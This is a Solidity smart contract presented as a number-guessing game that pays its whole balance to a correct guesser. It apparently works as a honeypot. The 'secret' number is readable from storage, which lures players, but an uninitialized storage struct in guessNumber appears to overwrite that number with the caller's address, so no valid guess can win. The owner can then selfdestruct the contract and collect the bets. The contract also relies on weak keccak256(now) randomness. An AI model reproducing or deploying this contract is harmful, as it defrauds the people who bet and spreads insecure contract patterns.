 

pragma solidity ^0.4.19;

 
contract GuessNumber {
   
  uint256 private randomNumber = uint256( keccak256(now) ) % 10 + 1;
  uint256 public lastPlayed;
  uint256 public minBet = 0.1 ether;
  address owner;

  struct GuessHistory {
    address player;
    uint256 number;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  
  function GuessNumber() public {
    owner = msg.sender;
  }

   
  function changeMinBet(uint256 _newMinBet) external onlyOwner {
    minBet = _newMinBet;
  }

  function guessNumber(uint256 _number) public payable {
    require(msg.value >= minBet && _number <= 10);

    GuessHistory guessHistory;
    guessHistory.player = msg.sender;
    guessHistory.number = _number;

     
     
    if (_number == randomNumber) {
      msg.sender.transfer(this.balance);
    }

    lastPlayed = now;
  }

  function kill() public onlyOwner {
    selfdestruct(owner);
  }

  function() public payable { }

}